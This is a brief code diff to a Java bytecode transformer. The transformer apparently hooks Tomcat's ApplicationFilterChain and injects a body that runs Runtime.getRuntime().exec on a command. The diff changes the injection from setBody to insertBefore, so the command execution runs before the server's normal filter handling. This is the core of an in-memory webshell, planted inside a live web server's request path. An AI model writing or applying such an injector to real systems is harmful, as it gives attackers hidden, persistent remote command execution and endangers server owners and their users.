@@ -37,7 +37,8 @@ public class ApplicationFilterChain_Transform_Filter implements ClassFileTransfo
                     "        Runtime.getRuntime().exec(cmd);\n" +
                     "    }\n" +
                     "}";
-            ctMethod.setBody(body);
+            //ctMethod.setBody(body);
+            ctMethod.insertBefore(body);
 
             // 返回目标类字节码
             byte[] bytes = ctClass.toBytecode();
